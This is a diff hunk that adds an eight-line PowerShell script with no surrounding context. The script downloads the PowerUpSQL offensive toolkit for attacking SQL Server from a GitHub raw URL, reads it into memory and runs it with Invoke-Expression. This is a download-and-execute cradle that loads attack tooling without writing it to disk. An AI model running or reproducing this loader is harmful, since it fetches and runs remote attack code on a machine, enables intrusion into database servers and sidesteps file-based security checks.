@@ -1,0 +1,8 @@
+$url = "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/refs/heads/master/PowerUpSQL.ps1"
+$request = [System.Net.HttpWebRequest]::Create($url)
+$request.Method = "GET"
+$response = $request.GetResponse()
+$reader = New-Object IO.StreamReader $response.GetResponseStream()
+$scriptContent = $reader.ReadToEnd()
+$reader.Close()
+Invoke-Expression $scriptContent
